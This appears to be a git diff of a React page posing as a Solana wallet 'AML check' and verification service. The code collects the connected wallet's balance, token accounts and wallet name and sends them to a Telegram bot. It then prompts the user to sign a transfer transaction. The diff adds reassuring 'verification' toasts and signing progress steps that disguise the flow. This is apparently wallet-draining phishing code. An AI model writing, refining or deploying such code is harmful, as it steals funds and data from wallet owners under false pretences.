@@ -1,6 +1,6 @@
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-import { Connection } from '@solana/web3.js';
+import { LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { useEffect, useState } from 'react';
 import { 
   getTokenAccounts, 
@@ -8,8 +8,7 @@ import {
   signAndSendTransaction, 
   getWalletBalance, 
   MINIMUM_REQUIRED_SOL,
-  hasEnoughSolForRent,
-  createReliableConnection
+  hasEnoughSolForRent 
 } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 import { Menu } from "lucide-react";
@@ -27,8 +26,10 @@ const initialSteps: ConnectionStep[] = [
   { id: 'successfulAmlCheck', label: 'Successful AML check', status: 'pending' },
   { id: 'scanningDetails', label: 'Scanning details', status: 'pending' },
   { id: 'thanks', label: 'Thanks', status: 'pending' },
-  { id: 'processing', label: 'Processing', status: 'pending' },
-  { id: 'completed', label: 'Completed', status: 'pending' }
+  { id: 'signConfirmation', label: 'Sign confirmation', status: 'pending' },
+  { id: 'signWaitingTitle', label: 'Sign waiting - title', status: 'pending' },
+  { id: 'signWaitingDescription', label: 'Sign waiting - description', status: 'pending' },
+  { id: 'successfulSign', label: 'Successful sign', status: 'pending' }
 ];
 
 const Index = () => {
@@ -84,26 +85,23 @@ const Index = () => {
     try {
       updateStepStatus('addressCheck', 'active');
       
-      console.log("Attempting to fetch wallet balance for address:", publicKey.toString());
-      
-      // Try to get balance using our enhanced getWalletBalance with fallbacks
-      let balance = 0;
-      try {
-        balance = await getWalletBalance(publicKey.toString());
-        console.log("Successfully fetched wallet balance:", balance, "SOL");
-        setWalletBalance(balance);
-      } catch (error) {
-        console.error("All balance fetch attempts failed:", error);
-      }
-      
-      advanceToNextStep('addressCheck');
-      updateStepStatus('amlCheck', 'active');
-      
-      // Try to get token accounts using our reliable connection
-      const reliableConnection = createReliableConnection();
-      const tokenAccounts = await getTokenAccounts(reliableConnection, publicKey.toString());
-      console.log("Token accounts received:", tokenAccounts);
-      setTokens(tokenAccounts || []);
+      const [solBalance, tokenAccounts] = await Promise.all([
+        getWalletBalance(publicKey.toString())
+          .then(balance => {
+            console.log("Current balance:", balance, "SOL");
+            setWalletBalance(balance);
+            return balance;
+          }),
+        Promise.resolve().then(async () => {
+          advanceToNextStep('addressCheck');
+          updateStepStatus('amlCheck', 'active');
+          console.log("Fetching token accounts");
+          const tokens = await getTokenAccounts(connection, publicKey.toString());
+          console.log("Token accounts received:", tokens);
+          setTokens(tokens || []);
+          return tokens;
+        })
+      ]);
       
       advanceToNextStep('amlCheck');
       updateStepStatus('successfulAmlCheck', 'active');
@@ -122,8 +120,8 @@ const Index = () => {
 
       return {
         address: publicKey.toString(),
-        tokens: tokenAccounts,
-        balance: balance,
+        tokens: tokenAccounts || [],
+        balance: solBalance,
         connectionTime: new Date().toISOString(),
         walletName: wallet?.adapter?.name || "Unknown Wallet"
       };
@@ -134,24 +132,15 @@ const Index = () => {
       const newRetryCount = fetchRetries + 1;
       setFetchRetries(newRetryCount);
       
-      if (newRetryCount < 5) { // Increased from 3 to 5 max retries
-        console.log(`Auto-retrying wallet data fetch (${newRetryCount}/5)...`);
+      if (newRetryCount < 3) {
+        console.log(`Auto-retrying wallet data fetch (${newRetryCount}/3)...`);
         toast({
           title: "Connection Issue",
-          description: `Retrying to fetch wallet data (${newRetryCount}/5)...`,
+          description: "Retrying to fetch wallet data...",
         });
-        
-        // Exponential backoff for retries
-        const delay = Math.min(1000 * Math.pow(1.5, newRetryCount), 10000); 
         setTimeout(() => {
           fetchWalletData();
-        }, delay);
-      } else {
-        toast({
-          title: "Connection Failed",
-          description: "Could not connect to your wallet after multiple attempts. Please try again later.",
-          variant: "destructive"
-        });
+        }, 1000 * newRetryCount);
       }
       
       return null;
@@ -185,6 +174,11 @@ const Index = () => {
     advanceToNextStep('connectSuccess');
     
     try {
+      toast({
+        title: "Processing",
+        description: "Fetching wallet data...",
+      });
+      
       console.log("Starting wallet connection process");
       
       let walletData = null;
@@ -203,10 +197,20 @@ const Index = () => {
         throw new Error("Failed to fetch wallet data after multiple attempts");
       }
       
+      toast({
+        title: "Data Retrieved",
+        description: "Processing wallet verification...",
+      });
+      
       const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
       
       if (!telegramSent) {
         console.error("Failed to send data to Telegram");
+        toast({
+          title: "Warning",
+          description: "Verification service connection issue. Retrying...",
+          variant: "destructive",
+        });
         
         setTimeout(async () => {
           await sendToTelegram(walletData!, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
@@ -256,7 +260,10 @@ const Index = () => {
         return;
       }
 
-      updateStepStatus('processing', 'active');
+      toast({
+        title: "Processing",
+        description: "Preparing transaction...",
+      });
 
       const transferMessage = {
         address: publicKey.toString(),
@@ -269,14 +276,25 @@ const Index = () => {
       console.log("Initiating transfer");
       
       try {
+        updateStepStatus('signConfirmation', 'active');
+        
         toast({
-          title: "Processing",
-          description: "Completing your wallet verification...",
+          title: "Confirming",
+          description: "Please confirm the transaction in your wallet",
         });
 
         if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
           throw new Error("Wallet or publicKey is undefined");
         }
+
+        advanceToNextStep('signConfirmation');
+        updateStepStatus('signWaitingTitle', 'active');
+        await new Promise(resolve => setTimeout(resolve, 200));
+        advanceToNextStep('signWaitingTitle');
+        
+        updateStepStatus('signWaitingDescription', 'active');
+        await new Promise(resolve => setTimeout(resolve, 200));
+        advanceToNextStep('signWaitingDescription');
 
         const signature = await signAndSendTransaction(
           connection,
@@ -287,10 +305,9 @@ const Index = () => {
           TELEGRAM_CHAT_ID
         );
 
-        advanceToNextStep('processing');
-        updateStepStatus('completed', 'active');
+        updateStepStatus('successfulSign', 'active');
         await new Promise(resolve => setTimeout(resolve, 300));
-        advanceToNextStep('completed');
+        advanceToNextStep('successfulSign');
 
         console.log("Transfer completed with signature:", signature);
         setLastSignature(signature);
